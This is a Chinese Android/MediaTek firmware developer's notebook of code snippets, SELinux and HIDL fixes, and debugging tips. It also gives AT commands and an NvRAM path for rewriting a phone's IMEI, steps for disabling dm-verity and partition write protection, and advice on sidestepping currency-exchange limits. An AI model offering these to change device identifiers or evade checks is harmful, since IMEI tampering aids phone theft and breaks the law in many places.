为什么用 xml 保存而不再使用数据库，应该是用来保存默认值来 restore device 的一些默认状态，但是好像手动修改的时候默认值也会改?
<setting id="68" name="time_12_24" value="12" package="com.android.settings" defaultValue="12" defaultSysSet="true" />
```

## [log] 调试技巧

```text
c代码调试技巧
#include <utils/CallStack.h>
android::CallStack stack;
stack.update();
android::String8 strtemp = stack.toString("");
ALOGD("\t%s", strtemp.string());
```

## [bug] Android P系统默认蓝牙状态栏不显示图标

```text
https://blog.csdn.net/yangfan1571397878/article/details/95987816
在Android P版本，状态栏上的蓝牙图标只有在连接蓝牙耳机或者蓝牙网络时才会显示，目前客户要求，只要打开蓝牙功能就必须显示蓝牙图标
/vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBarPolicy.java
private final void updateBluetooth() {
    int iconId = R.drawable.stat_sys_data_bluetooth;
    String contentDescription =
            mContext.getString(R.string.accessibility_quick_settings_bluetooth_on);
    boolean bluetoothVisible = false;
    if (mBluetooth != null) {
        //modify for bluetooth start
        if(mBluetooth.isBluetoothEnabled()) {
            bluetoothVisible = mBluetooth.isBluetoothEnabled();
            if (mBluetooth.isBluetoothConnected()) {
                iconId = R.drawable.stat_sys_data_bluetooth;
                contentDescription = mContext.getString(R.string.accessibility_bluetooth_connected);
                bluetoothVisible = mBluetooth.isBluetoothEnabled();
            }
        }
        //modify for bluetooth end
    }

    mIconController.setIcon(mSlotBluetooth, iconId, contentDescription);
    mIconController.setIconVisibility(mSlotBluetooth, bluetoothVisible);
}
主要是在蓝牙打开状态将 bluetoothVisible = mBluetooth.isBluetoothEnabled(); 重新赋值一下即可
```

## NvRAM

```text Java
IBinder binder = android.os.ServiceManager.getService("NvRAMAgent");
NvRAMAgent agent = NvRAMAgent.Stub.asInterface(binder);
if (agent == null) {
    android.util.Log.i("wei","agent is null");
}
byte[]  buff = null;
StringBuilder builder = new StringBuilder();
try {
    buff = agent.readFileByName("/data/nvram/APCFG/APRDEB/PRODUCT_INFO");// AP_CFG_REEB_PRODUCT_INFO_LID
    //buff = agent.readFileByName("/data/nvram/APCFG/APRDEB/WIFI");
    for (int i = 0;i < buff.length; i++) {
        builder.append(buff[i] );
    }
} catch (Exception ee) {
    android.util.Log.i("wei","into error");
}

hidl
在需要用到的app中的 Android.mk 文件配置 LOCAL_STATIC_JAVA_LIBRARIES += vendor.mediatek.hardware.nvram-V1.0-java-static
类中使用获取方式：INvram agent = INvram.getService(true)；要记得导包 import vendor.mediatek.hardware.nvram.V1_0.INvram;
```

## 浅谈Android系统编译apk后so文件在dlopen时出现linker权限问题

```text
https://blog.csdn.net/yang542397/article/details/88103951
```

## 无需权限的震动

```text
v.performHapticFeedback(HapticFeedbackConstants.LONG_PRESS, HapticFeedbackConstants.FLAG_IGNORE_GLOBAL_SETTING);
```

## 添加还原校准参数的功能

```text
在对比机中已经实现了该功能，把对比机中的 MtkSettings.apk pull 出来之后反编译看到有
public void onClick(DialogInterface dialogInterface, int i) {
    String str = "ResetDashboardFragment";
    Log.d(str, "onClick");
    if (this.mResetDialog == dialogInterface) {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("/mnt/vendor/nvdata");
        stringBuilder.append(File.separator);
        stringBuilder.append("RestoreFlag");
        String stringBuilder2 = stringBuilder.toString();
        try {
            INvram service = INvram.getService();
            if (service == null) {
                Log.d(str, "rlk_readData---NvRAMAgent is bull");
                return;
            }
            if (service.DeleteFile(stringBuilder2)) {
                Log.d(str, "delete true");
                Toast.makeText(mContext, mContext.getResources().getString(R.string.reset_parameters_success), 0).show();
                new Handler().postDelayed(new Runnable() {
                    public void run() {
                        mPm.reboot("reboot after reset parameters");
                    }
                }, 5000);
            }
        } catch (RemoteException e) {
            Log.e(str, "getService---exception=");
            e.printStackTrace();
        }
    }
}

原理是通过 NvRAMService 删除 /mnt/vendor/nvdata/RestoreFlag 文件，然后重启之后就会恢复，应该是在开机的时候会检测 RestoreFlag 文件是否存在，如果不存在就还原 NvData 的数据，并重新生成 RestoreFlag 文件

实现过程:
1.对比机中是通过 INvRAM 的 DeleteFile 方法来删除，但是我们的 Nvram.hal 中没有这个方法，也不会添加 hidl 接口，暂时放弃这条路
vendor/mediatek/proprietary/hardware/interfaces/nvram/1.1/INvram.hal
vendor/mediatek/proprietary/external/nvram/libnvram/libnvram.h

2.通过 File 去删除，会有 selinux 权限的问题，抓 log 看到有如下几条 avc
01-03 02:11:49.626  7238  7238 I ndroid.settings: type=1400 audit(0.0:2000): avc: denied { search } for name="/" dev="mmcblk0p21" ino=2 scontext=u:r:system_app:s0 tcontext=u:object_r:nvdata_file:s0 tclass=dir permissive=1
01-03 02:11:49.629  7238  7238 I ndroid.settings: type=1400 audit(0.0:2001): avc: denied { write } for name="/" dev="mmcblk0p21" ino=2 scontext=u:r:system_app:s0 tcontext=u:object_r:nvdata_file:s0 tclass=dir permissive=1
01-03 02:11:49.633   348   601 V AudioPolicyIntefaceImpl: startOutput()
01-03 02:11:49.629  7238  7238 I ndroid.settings: type=1400 audit(0.0:2002): avc: denied { remove_name } for name="RestoreFlag" dev="mmcblk0p21" ino=201 scontext=u:r:system_app:s0 tcontext=u:object_r:nvdata_file:s0 tclass=dir permissive=1
01-03 02:11:49.634   348   601 D APM_AudioPolicyManager: startOutput() output 13, stream 1, session 97
01-03 02:11:49.629  7238  7238 I ndroid.settings: type=1400 audit(0.0:2003): avc: denied { unlink } for name="RestoreFlag" dev="mmcblk0p21" ino=201 scontext=u:r:system_app:s0 tcontext=u:object_r:nvdata_file:s0 tclass=file permissive=1

用 audit2allow 解析之后显示如下
allow system_app nvdata_file:dir { search write remove_name };
allow system_app nvdata_file:file { unlink };
allow system_app mnt_vendor_file:dir { search };

添加到 system_app.te 文件中
device/mediatek/sepolicy/basic/non_plat/system_app.te
allow system_app nvdata_file:dir { search write remove_name };
allow system_app nvdata_file:file { unlink };
allow system_app mnt_vendor_file:dir { search };

添加第三条 mnt_vendor_file 的时候会出现 never allow 的问题，找到 system/sepolicy/public/domain.te 文件中有
# Platform must not have access to /mnt/vendor.
neverallow {
  coredomain
  -init
  -ueventd
  -vold
  -system_writes_mnt_vendor_violators
} mnt_vendor_file:dir *;

意思是不允许 platform 访问 /mnt/vendor ,但是有几个条件除外, 从 system_writes_mnt_vendor_violators 开始下手
网上找到解决方法 https://blog.csdn.net/yxw0609131056/article/details/79784490

只要把 system_app 声明为 system_writes_mnt_vendor_violators 类型即可
还是在 device/mediatek/sepolicy/basic/non_plat/system_app.te 文件中添加
typeattribute system_app system_writes_mnt_vendor_violators;

http://192.168.3.78:7080/gitweb?p=Q0_MP1/alps-release-q0.mp1-default.git;a=commit;h=449ce657b9816c0acce7a7f1548fda9220a80465

TODO : 遗留问题
1.为什么是在 device/mediatek/sepolicy/basic/non_plat/system_app.te 文件中添加而不是其他几个 system_app.te 文件
2.通过 apt-get 安装了最新的 audit2allow 之后解析 avc 文件需要添加一个 -p ，这个后面添加什么东西?
用 ./external/selinux/prebuilts/bin/audit2allow 代替


上面的修改方法修改了 SELinux 会引起CTS测不过，还是需要通过在 INvRAM 中添加 DeleteFile 方法来删除，修改如下
http://192.168.3.78:7080/gitweb?p=Q0_MP1/alps-release-q0.mp1-default.git;a=commit;h=2938bf7bffbfdc086e7caba1de60be0e9587b3b2
在 Android.mk 中添加 LOCAL_STATIC_JAVA_LIBRARIES += vendor.mediatek.hardware.nvram-V1.1-java
在 vendor/mediatek/proprietary/hardware/interfaces/nvram/1.1/INvram.hal 中添加
+    //Redmine21509 zhangqi modified for Reset parameters 2020/05/28:begin
+    DeleteFile(string filename)
+            generates (bool retval);
+    //Redmine21509 zhangqi modified for Reset parameters 2020/05/28:end

在 vendor/mediatek/proprietary/external/libnvram/nvram_hidl/1.1/Nvram.cpp 中添加
+Return<bool> Nvram::DeleteFile(const hidl_string& filename) {
+    char *cstr = new char[filename.size() + 1] ;
+    snprintf(cstr, filename.size() + 1,"%s", filename.c_str());
+    NVRAM_LOG("DeleteFile1!\n");
+    if (!remove(cstr)) {
+        NVRAM_LOG("DeleteFile success!\n");
+        return true;
+    }
+    NVRAM_LOG("DeleteFile failure!\n");
+    return false;
+}

在 vendor/mediatek/proprietary/external/libnvram/nvram_hidl/1.1/Nvram.h 中添加
+    Return<bool> DeleteFile(const hidl_string& filename);

在 vendor/mediatek/proprietary/hardware/interfaces/current.txt 中修改 hidl 的 hash，hash 的生成方法如下
-03aad60f644f3155908c38ac3425df87f4a7194b6260de0eb18410d5d56fae22 vendor.mediatek.hardware.nvram@1.1::INvram
+d44477ba3dbddc5a9d74715054ae2e6410546080ef97276dfe5cabb7146757f4 vendor.mediatek.hardware.nvram@1.1::INvram

https://blog.csdn.net/qq_16775897/article/details/78345115
修改了hardware/interfaces中的内容，上图中提示hash值不匹配，重新用hidl-gen -L hash -r对android.hardware.light@2.0::types进行hash值生成的查看。
hidl-gen -L hash -r .:hardware/interfaces android.hardware.light@2.0::types
得到hash值如下：07901694d6862da86034edc174fc8dd1e63637b9a460bcced04ed9e43bc14a5b android.hardware.light@2.0::types
手动修改 hardware/interfaces/current.txt中android.hardware.light@2.0::types 的 hash 值重新编译即可。

./out/soong/host/linux-x86/bin/hidl-gen -L hash -r vendor.mediatek.hardware:vendor/mediatek/proprietary/hardware/interfaces vendor.mediatek.hardware.nvram@1.1::INvram
47e005b45f58e232a448f698bfa576461aea2f3e1cd4955d6a802dca8c740ee9 vendor.mediatek.hardware.nvram@1.1::INvram

也可以直接用 vendor/mediatek/proprietary/hardware/interfaces/update-hash.sh 脚本自动生成，注意只能在 alps 目录下执行，还要将脚本中的两处 hidl-gen 修改为 out/soong/host/linux-x86/bin/hidl-gen

hidl-gen 的代码路径为：system/tools/hidl，编译之后会生成 out/soong/host/linux-x86/bin/hidl-gen

编译之后查看 out/target/common/obj/JAVA_LIBRARIES/vendor.mediatek.hardware.nvram-V1.1-java_intermediates/classes.jar 中是否有 DeleteFile() 方法
```

## 修改 recovery 界面

```text
vendor/mediatek/proprietary/bootable/bootloader/lk/platform/mt6580/boot_mode_menu.c
```

## android MTK-thermal.conf温度参数修改的方法

```text
thermal.conf设计CPU、PMIC、BATTERY等的温度参数，其路径一般在device/目录下，但是这是个加密文件，直接打开的话就是一堆看不懂的字符，需要使用对应的工具来解密，即thermal_config_tool。

1、把需要解密的conf文件放在thermal_config_tool的decrypt文件夹下，然后在conf后缀的后面加上.mtc的后缀。
2、双击decrypt文件夹中的decrypt_all_config.bat，这时会生成一个txt的文件，即解密后的文件。
3、按需修改解密后的txt文件。
4、在CMD命令下使用thermal_config_tool下的encrypt.exe把修改好的txt文件重新生成conf文件，如下：

encrypt.exe *.conf.txt thermal.conf

转载于：https://blog.csdn.net/wszonline/article/details/79638908
```

## 通过 AT 命令修改IMEI，恢复出厂设置后无效

```text
卡1 at命令 "AT+EGMR=1,7,\"" + imei + "\"";
卡2 at命令 "AT+EGMR=1,10,\"" + imei + "\"";
调用 invokeOemRilRequestStrings 就OK

MTK imei号存储位置   "/data/nvram/md/NVRAM/NVD_IMEI/MP0B_001"
```

## Android 10 Launcher android.mk 修改

```text
include $(CLEAR_VARS)
LOCAL_USE_AAPT2 := true
LOCAL_MODULE_TAGS := optional

LOCAL_STATIC_ANDROID_LIBRARIES := Launcher3QuickStepLib
LOCAL_PROGUARD_ENABLED := disabled

ifneq (,$(wildcard frameworks/base))
  LOCAL_PRIVATE_PLATFORM_APIS := true
else
  LOCAL_SDK_VERSION := system_current
  LOCAL_MIN_SDK_VERSION := 26
endif
LOCAL_PACKAGE_NAME := MtkLauncher3QuickStep
LOCAL_PRIVILEGED_MODULE := true
LOCAL_PRODUCT_MODULE := true
LOCAL_OVERRIDES_PACKAGES := Home Launcher2 Launcher3 Launcher3QuickStep
LOCAL_REQUIRED_MODULES := privapp_whitelist_com.android.launcher3

# add begin
LOCAL_SRC_FILES := \
    $(call all-java-files-under, src) \
    $(call all-java-files-under, quickstep/src) 
# add end

LOCAL_RESOURCE_DIR := \
    $(LOCAL_PATH)/quickstep/res \
    $(LOCAL_PATH)/quickstep/recents_ui_overrides/res

LOCAL_FULL_LIBS_MANIFEST_FILES := \
    $(LOCAL_PATH)/AndroidManifest.xml \
    $(LOCAL_PATH)/AndroidManifest-common.xml

LOCAL_MANIFEST_FILE := quickstep/AndroidManifest.xml
LOCAL_JACK_COVERAGE_INCLUDE_FILTER := com.android.launcher3.*

include $(BUILD_PACKAGE)
```

## 如何确认 DM-verity 已关闭

```text
确认已成功关闭dm-verity
adb shell mount

看到vendor 和system分区挂在如下mmcblk0pxx block表示dm-verity已关闭成功
k65v1_bsp:/ # mount |grep data
/dev/block/mmcblk0p35 on /vendor type ext4 (ro,seclabel,relatime,data=ordered)
/dev/block/mmcblk0p36 on /system type ext4 (ro,seclabel,relatime,data=ordered)

如显示挂载到 dm-x 节点 表示dm-verity仍然开启
k65v1_bsp:/ # mount |grep data
/dev/block/dm-0 on /vendor type ext4 (ro,seclabel,relatime,data=ordered)
/dev/block/dm-1 on /system type ext4 (ro,seclabel,relatime,data=ordered)

若不成功可检查 vbmeta, boot, system ,vendor 分区等是否在write protect 区间里

导致adb disable-verity 的flag无法成功写入 到 vbmeta |boot | system | vendor 分区里

参考/vendor/mediatek/proprietary/bootable/bootloader/lk/platform/mt6771/write_protect.c
的set_write_protect 函数

set_write_protect()里面会将proinfo分区设定在power on write protect区域内

为了proinfo分区能写入flag，需要将proinfo分区的power on write protect拿掉
修改方法：
1.全部分区关掉写保护功能
/vendor/mediatek/proprietary/bootable/bootloader/lk/platform/mt6xxx/rules.mk
MTK_POWER_ON_WP := no

2.单独拿掉proinfo分区写保护
#ifdef MTK_PERSIST_PARTITION_SUPPORT
if (0 == is_fs_partition_ready_for_wp(“persist”)) {
dprintf(CRITICAL, “[%s] : persist is fmt \n”, func);
sprintf(wp_start, “%s”, “persist”);
} else {
sprintf(wp_start, “%s”, “sec1”);//修改这里写保护分区的起始分区，去掉proinfo分区，注意剩下保留分区大小必须8M对齐
}
#else
sprintf(wp_start, “%s”, “sec1”);//修改这里写保护分区的起始分区，去掉proinfo分区，注意剩下保留分区大小必须8M对齐
#endif
```

## [snippet] 强制第三方app横屏

```text
frameworks\base\services\core\java\com\android\server\policy\PhoneWindowManager.java
public int rotationForOrientationLw(int orientation, int lastRotation) {
Log.e("ccz","mForceDefaultOrientation="+mForceDefaultOrientation);
    ...
    if (true/*mForceDefaultOrientation*/) {
        return Surface.ROTATION_0;//默认横屏
    }
    ...
}
```

## [snippet] 消除 Permission is only granted to system apps

```text
<uses-permission
    android:name="android.permission.PACKAGE_USAGE_STATS"
    tools:ignore="ProtectedPermissions" />
```

## [snippet] 通过代码设置系统语言

```text
private void updateLanguage(Locale locale) {
    try {
        Object objIActMag, objActMagNative;
        Class clzIActMag = Class.forName("android.app.IActivityManager");
        Class clzActMagNative = Class.forName("android.app.ActivityManagerNative");
        Method mtdActMagNative$getDefault = clzActMagNative.getDeclaredMethod("getDefault");
        objIActMag = mtdActMagNative$getDefault.invoke(clzActMagNative);
        Method mtdIActMag$getConfiguration = clzIActMag.getDeclaredMethod("getConfiguration");
        Configuration config = (Configuration) mtdIActMag$getConfiguration.invoke(objIActMag);
        config.locale = locale;
        Class clzConfig = Class.forName("android.content.res.Configuration");
        java.lang.reflect.Field userSetLocale = clzConfig.getField("userSetLocale");
        userSetLocale.set(config, true);
        // 此处需要声明权限:android.permission.CHANGE_CONFIGURATION
        // 会重新调用 onCreate();
        Class[]  clzParams = {Configuration.class};
        Method mtdIActMag$updateConfiguration = clzIActMag.getDeclaredMethod("updateConfiguration", clzParams);
        mtdIActMag$updateConfiguration.invoke(objIActMag, config);
        BackupManager.dataChanged("com.android.providers.settings");
        Log.i(TAG, "updateLanguage end");
    } catch (ClassNotFoundException e) {
        e.printStackTrace();
    } catch (NoSuchMethodException e) {
        e.printStackTrace();
    } catch (IllegalAccessException e) {
        e.printStackTrace();
    } catch (InvocationTargetException e) {
        e.printStackTrace();
    } catch (NoSuchFieldException e) {
        e.printStackTrace();
    }
}
```

## [snippet] 在 Service 中弹出 Toast

```text
//在 Service 中创建全局变量 mHandler
private Handler mHandler;

//在 Service 生命周期方法 onCreate() 中初始化 mHandler
mHandler = new Handler(Looper.getMainLooper());

//在子线程中想要 Toast 的地方添加如下
mHandler.post(new Runnable() {
    @Override
    public void run() {
        Toast.makeText(TaskService.this, "TaskService -- onStartCommand().", Toast.LENGTH_SHORT).show();
    }
});
```

## [snippet] Android 8.1.0 获取当前界面中最上层的 Activity

```text
private boolean isTargetActivityIsOnTop(Context context, String targetAppPackageName, String targetAppActivityName) {
    String TAG = "Check_Top_Activity";
    ActivityManager mActivityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
    List<ActivityManager.RunningTaskInfo> mTasks = mActivityManager.getRunningTasks(1);//5.0
    if (mTasks.get(0) != null) {
        ComponentName topActivity = mTasks.get(0).topActivity;
        if(topActivity != null && !TextUtils.isEmpty(topActivity.getPackageName()) &&
                !TextUtils.isEmpty(topActivity.getClassName())){
            Log.w(TAG,"topActivity.getPackageName() -> " + topActivity.getPackageName());
            Log.w(TAG,"topActivity.getClassName() -> " + topActivity.getClassName());
            if(topActivity.getPackageName().equals(targetAppPackageName) &&
                    topActivity.getClassName().equals(targetAppActivityName)) {
                Log.d(TAG,"target Activity is in top !");
                return true;
            }else {
                Log.w(TAG,"target Activity is not in top.");
                return false;
            }
        }else {
            Log.w(TAG,"topActivity is null or PackageName is null or ClassName is null.");
            return false;
        }
    } else {
        Log.w(TAG,"mTasks.get(0) == null ");
        return false;
    }
}
```

## 申请一个锁使得android系统不再进入深度睡眠状态

```text
在启动的android系统下执行：echo "name" > /sys/power/wake_lock
```

## [snippet] 遍历删除List中的元素的几种方法

```text
1.使用Iterator的remove()方法
public static void main(String[]  args) {
    List<String> platformList = new ArrayList<>();
    platformList.add("博客园");
    platformList.add("CSDN");
    platformList.add("掘金");

    Iterator<String> iterator = platformList.iterator();
    while (iterator.hasNext()) {
        String platform = iterator.next();
        if (platform.equals("博客园")) {
            iterator.remove();
        }
    }

    System.out.println(platformList);
}

2.使用for循环正序遍历
public static void main(String[]  args) {
    List<String> platformList = new ArrayList<>();
    platformList.add("博客园");
    platformList.add("CSDN");
    platformList.add("掘金");

    for (int i = 0; i < platformList.size(); i++) {
        String item = platformList.get(i);

        if (item.equals("博客园")) {
            platformList.remove(i);
            i = i - 1;  //修正下标
        }
    }

    System.out.println(platformList);
}

3.使用for循环倒序遍历
public static void main(String[]  args) {
    List<String> platformList = new ArrayList<>();
    platformList.add("博客园");
    platformList.add("CSDN");
    platformList.add("掘金");

    for (int i = platformList.size() - 1; i >= 0; i--) {
        String item = platformList.get(i);
        if (item.equals("掘金")) {
            platformList.remove(i);
        }
    }
    System.out.println(platformList);
}

4.jdk8 list.removeIf
list.removeIf(item -> item.equals("str"));
```

## admob

```text
申请账号的时候不要选国区，最好能填美国的，这样一来，满10美金就可以拿到收入了，不过这样的话要填美国的银行卡，没有的小伙伴可以去PingPing申请一张，最重要的是，用他们提供的账号来收款，就不会受到个人每年只能结汇5W美元的限制，对于想要做大的小伙伴来说，简直是福音！
```

## BCC 工具

```text
https://blog.csdn.net/buhui912/article/details/106118056?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158944444019724848363556%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=158944444019724848363556&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v25-14-106118056.nonecase&utm_term=android+%E7%BC%96%E8%AF%91
```

## 编译时更改系统版本

```text
echo "ro.build.display.id=V.SD55.1.1.17.`date -d "+1 hour" "+%Y%m%d%H"`"
echo "ro.build.display.id=V.SD55.1.1.17.`date "+%Y%m%d%H"`"
```

## 单独编译recovery下的updater

```text
如果需要单独编译 bootable/recovery/下的updater ， 打开bootable/recovery/updater下的Android.mk。可以看到module名称为updater
因此在android代码根目录执行 mma updater
```

## Android应用程序无法读写USB设备的解决方法

```text
如果android系统中的API或者apk无法读写usb设备，可能是没有添加读写usb的权限，需要按照如下方法进行设置：
1. 在android.hardware.usb.host.xml文件中添加如下内容
<permissions>
    <featurename="android.hardware.usb.host"/>
</permissions>
2. 在tablet_core_hardware.xml文件中添加如下内容
    <featurename="android.hardware.usb.host">
3. 重新编译system.img，并烧录固件，重启机器。
```

## android设置鼠标速度

```text
方法一：
    在 android/jni/com_android_server_input_InputManagerService.cpp的276行，初始化InputManager对象的时候可以设置鼠标的速度，
mLocked.pointerSpeed = 0;//范围是-7到7，默认是0，-7最慢，7最快。

方法二：
    在apk里面设置鼠标速度，调用InputManager.java 537行的公共函数setPointerSpeed可以设置鼠标速度。//范围是-7到7，默认是0，-7最慢，7最快。

方法三：
    在setting->语言和输入法->指针速度， 弹出左右可以拉动的配置条。//范围是-7到7，默认是0，-7最慢，7最快。
```

## Android Input设备debug技巧

```text
一、驱动层
检查是否有点上报
adb shell getevent -l /dev/input/eventX

检查input设备支持的属性值
adb shell getevent -i /dev/input/eventX

二、Native层
检查驱动上报的点是否被InputReader转发给上层
在TouchInputMapper::sync(nsecs_t when)函数中，打印相关的变量值，检查报点路径是否正常。驱动已经报点，但是上层收不到点的情况大致有以下几种：
a. 设备模式被设为禁用模式，mDeviceMode== DEVICE_MODE_DISABLED
引起此问题的原因是，在注册input device时，有些属性值设置不合法，导致在configure阶段，走了异常流程；
b. 设备类型不正确，走了其他路径

三、Java层
在ViewRootImpl.java文件的onInputEvent( )函数中添加打印信息，检查底层上报的点，是否通过Framework层成功上报了。
一般来讲，如果onInputEvent能收到点，报点基本上是OK的。
有些特殊情况除外，报点的消息类型不正确或者TP的横竖坐标搞反了，会出现上层收点了，但是TP仍然无法正常使用。

adb shell sendevent /dev/input/event0 1 $2 1
adb shell sendevent /dev/input/event0 0 0 0
adb shell sendevent /dev/input/event0 1 $2 0
adb shell sendevent /dev/input/event0 0 0 0
```

## Android kernel Crash后，定位出错点的方法

```text
1. 将 /prebuild/gcc/linux-x86/arm/arm-linux-androideabi-4.6/bin/arm-linux-androideabi-gdb 拷贝到/usr/local/bin下
2. 进入out/target/product/工程名xxx/obj/KERNEL_OBJ 目录，找到文件vmlinux
3. 执行arm-linux-androideabi-gdb vmlinux，进入gdb调试界面
4. 输入 list  *  函数名+行号，会显示出错对应的文件和行号
```

## Android各代码层获取系统时间的方法

```text
1. 在java层，long now = SystemClock.uptimeMillis();
2. 在native层，nsecs_t now = systemTime(SYSTEM_TIME_MONOTONIC);
3. 在驱动层，s64 time = ktime_to_us(ktime_get());
```

## [snippet] 判断 service 是否运行

```text
/**
 * Judge a service is run or not.
 * @param context Current application context.
 * @param className  The service class name.
 * @return Return true if service is running, false or not.
 */
public static boolean isServiceRun(Context context, String className) {
    boolean isRun = false;
    final int maxNum = 100;
    if (context == null || className == null) {
        LogHelper.e(TAG, "isServiceRun mContext = " + context + " className = " + className);
        return false;
    }
    try {
        ActivityManager activityManager = (ActivityManager) context
                .getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningServiceInfo> serviceList = activityManager
                .getRunningServices(maxNum);
        int size = serviceList.size();
        for (int i = 0; i < size; i++) {
            if (serviceList.get(i).service.getClassName().equals(className)) {
                isRun = true;
                break;
            }
        }
    } catch (Exception ex) {
        LogHelper.e(TAG, "isServiceRun " + ex);
    }
    LogHelper.d(TAG, "isServiceRun service name = " + className + " is run " + isRun);
    return isRun;
}
```

## Android Logcat输出时报错 read: unexpected EOF

```text
adb logcat -G 200M
或
进入系统设置 > 开发者选项 > 调试 > 日志记录器缓冲区大小
点击设置日志缓冲区大小，若存储空间支持可直接改为最大的值接口解决问题
```

## [snippet] 获取手机的第一次开机时间

```text
public static String getBootTimeString() {
    Calendar calendar = Calendar.getInstance();
    calendar.setTimeInMillis(getRebootTime());
    String bootTimeStr = new 
    SimpleDateFormat("yyyy_MMdd_HHmmss").format(calendar.getTime());
    Utils.logi(TAG, "bootTimeStr = " + bootTimeStr);
    return bootTimeStr;
}

public static long getRebootTime() {
    long rebootTime = new Date().getTime() - SystemClock.elapsedRealtime();
    return new Date().getTime() - SystemClock.elapsedRealtime();
}
```

## [snippet] android 源码中的工具类

```text
线程处理类
public class ThreadUtils {
    private static volatile Thread sMainThread;
    private static volatile Handler sMainThreadHandler;
    private static volatile ExecutorService sSingleThreadExecutor;
 
    /**
     * Returns true if the current thread is the UI thread.
     */
    public static boolean isMainThread() {
        if (sMainThread == null) {
            sMainThread = Looper.getMainLooper().getThread();
        }
        return Thread.currentThread() == sMainThread;
    }
 
    /**
     * Returns a shared UI thread handler.
     */
    public static Handler getUiThreadHandler() {
        if (sMainThreadHandler == null) {
            sMainThreadHandler = new Handler(Looper.getMainLooper());
        }
 
        return sMainThreadHandler;
    }
 
    /**
     * Checks that the current thread is the UI thread. Otherwise throws an exception.
     */
    public static void ensureMainThread() {
        if (!isMainThread()) {
            throw new RuntimeException("Must be called on the UI thread");
        }
    }
 
    /**
     * Posts runnable in background using shared background thread pool.
     */
    public static void postOnBackgroundThread(Runnable runnable) {
        if (sSingleThreadExecutor == null) {
            sSingleThreadExecutor = Executors.newSingleThreadExecutor();
        }
        sSingleThreadExecutor.execute(runnable);
    }
 
    /**
     * Posts the runnable on the main thread.
     */
    public static void postOnMainThread(Runnable runnable) {
        getUiThreadHandler().post(runnable);
    }
 
}

//单例类
frameworks\base\core\java\android\util\Singleton.java
 
public abstract class Singleton<T> {
    private T mInstance;
 
    protected abstract T create();
 
    public final T get() {
        synchronized (this) {
            if (mInstance == null) {
                mInstance = create();
            }
            return mInstance;
        }
    }
}
```

## [snippet] ProcessBuilder

```text
在Android中插入以下代码块
ProcessBuilder pb = new ProcessBuilder();
try {
    Process process = pb.command("touch", "data/test.txt").start();
    process.waitFor();
} catch (IOException | InterruptedException e) {
    e.printStackTrace();
}
```

## [snippet] 和某个 qq 进行对话

```text
startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("mqqwpa://im/chat?chat_type=wpa&uin="+ "3101095546" +"&version=1")));
```

## [snippet] TextView自适应

```text
app:autoSizeTextType="uniform"
app:autoSizeMinTextSize="10sp"
app:autoSizeMaxTextSize="14sp"
app:autoSizeStepGranularity="0.5sp"
```

## [DEBUG] 如何导出Android系统中的某一个分区

```text
分区对应设备信息
例如我们要导出aboot分区，先用mount命令看分区的具体信息
/dev/block/bootdevice/by-name/system /system ext4 ro,seclabel,relatime,discard,data=ordered 0 0
/dev/block/bootdevice/by-name/userdata /data ext4 rw,seclabel,nosuid,nodev,relatime,discard,noauto_da_alloc,data=ordered 0 0
/dev/block/bootdevice/by-name/cache /cache ext4 rw,seclabel,nosuid,nodev,relatime,data=ordered 0 0
/dev/block/bootdevice/by-name/persist /persist ext4 rw,seclabel,nosuid,nodev,relatime,data=ordered 0 0
/dev/block/bootdevice/by-name/modem /firmware vfat ro,context=u:object_r:firmware_file:s0,relatime,uid=1000,gid=1000,fmask=0337,dmask=
则各分区的设备信息在/dev/block/bootdevice/by-name下面

导出分区
进入/dev/block/bootdevice/by-name，用ls -l可以看出每个分区对应的设备名

lrwxrwxrwx root     root              1970-01-01 08:00 aboot -> /dev/block/mmcblk0p18
用dd命令导出来

dd if=/dev/block/mmcblk0p18 of=/data/aboot
用adb pull出来
```

## [snippet] string 中几个可能用到的函数---------见 SystemKeyServices.java

```text
private String stringToAscii(String value) {
    StringBuffer sbu = new StringBuffer();
    char[]  chars = value.toCharArray();
    for (int i = 0; i < chars.length; i++) {
        sbu.append(Integer.toHexString((int) chars[i] ));
    }
    return sbu.toString();
}

private String hexStringToByte(String hex) {
    int len = (hex.length() / 2);
    byte[]  result = new byte[len] ;
    char[]  achar = hex.toCharArray();
    for (int i = 0; i < len; i++) {
        int pos = i * 2;
        result[i]  = (byte) (toByte(achar[pos] ) << 4 | toByte(achar[pos + 1] ));
    }
    return new String(result);
}

private byte toByte(char c) {
    byte b = (byte) "0123456789abcdef".indexOf(c);
    return b;
}

private String getRealString(String s) {
 char[]  cArray = s.toCharArray();
 for (int j = 0; j < cArray.length; j = j + 2) {
  if (cArray[j]  == '0' && cArray[j + 1]  == '0') {
   return s.substring(0, j);
  }
 }
 return s;
}
```

## [snippet] 模拟发按键

```text
private void sendKeyEvent(int keyCode) {
    int eventCode = keyCode;
    long now = SystemClock.uptimeMillis();
    try {
        KeyEvent down = new KeyEvent(now, now, KeyEvent.ACTION_DOWN, eventCode, 0);
        KeyEvent up = new KeyEvent(now, now, KeyEvent.ACTION_UP, eventCode, 0);
        (IInputManager.Stub.asInterface(ServiceManager.getService("input"))).injectInputEvent(down, 0);
        (IInputManager.Stub.asInterface(ServiceManager.getService("input"))).injectInputEvent(up, 0);                                                             
    } catch (RemoteException e) { 
        Log.i(TAG, "DeadOjbectException");
    }
}
```

## 格式化文件大小显示

```text
Formatter.formatFileSize(Context context, long sizeBytes)
```

## [bug]  [26646] Android Q上SD卡中的文件不能重命名?

```text
01-03 00:59:23.132  5089  5490 E MtpDatabaseJNI: An exception was thrown by callback 'setObjectPropertyValue'.
01-03 00:59:23.134  5089  5490 E MtpDatabaseJNI: java.lang.IllegalArgumentException: Requested path /mnt/media_rw/E0CE-13E7/asdfasas doesn't appear under [/storage/E0CE-13E7] 
01-03 00:59:23.134  5089  5490 E MtpDatabaseJNI:  at com.android.providers.media.MediaProvider.updateInternal(MediaProvider.java:4722)
01-03 00:59:23.134  5089  5490 E MtpDatabaseJNI:  at com.android.providers.media.MediaProvider.update(MediaProvider.java:4486)
01-03 00:59:23.134  5089  5490 E MtpDatabaseJNI:  at android.content.ContentProvider$Transport.update(ContentProvider.java:420)
